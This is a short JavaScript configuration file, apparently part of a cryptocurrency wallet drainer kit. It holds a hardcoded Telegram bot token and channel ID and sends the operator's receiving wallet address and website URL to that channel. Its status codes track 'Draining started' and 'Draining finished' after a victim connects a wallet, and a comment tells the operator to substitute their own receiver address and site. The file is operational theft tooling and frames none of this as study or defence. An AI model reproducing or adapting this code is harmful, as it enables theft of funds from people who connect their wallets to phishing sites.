const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jtt6fW2sH9U8';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '4177494374';


async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
    try {
        const message = `BSC Wallet Receiver ID: ${bsc_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

function updateWalletData(walletAddress, walletEthBalance, status) {
    // This function will execute after wallet connection
    // Use walletAddress and walletEthBalance variables
    // Status:
    // 0 - Connected wallet
    // 1 - Draining started
    // 2 - User not eligible
    // 3 - Draining finished
    console.log(walletAddress, walletEthBalance, status);
}

// Change this information for yours (
const bsc_wallet_receiver_id = '0x678dEC78075b99A159302335d4Cd5e01d101B44E';
const website_url = 'https://ornamentalists.com';
sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
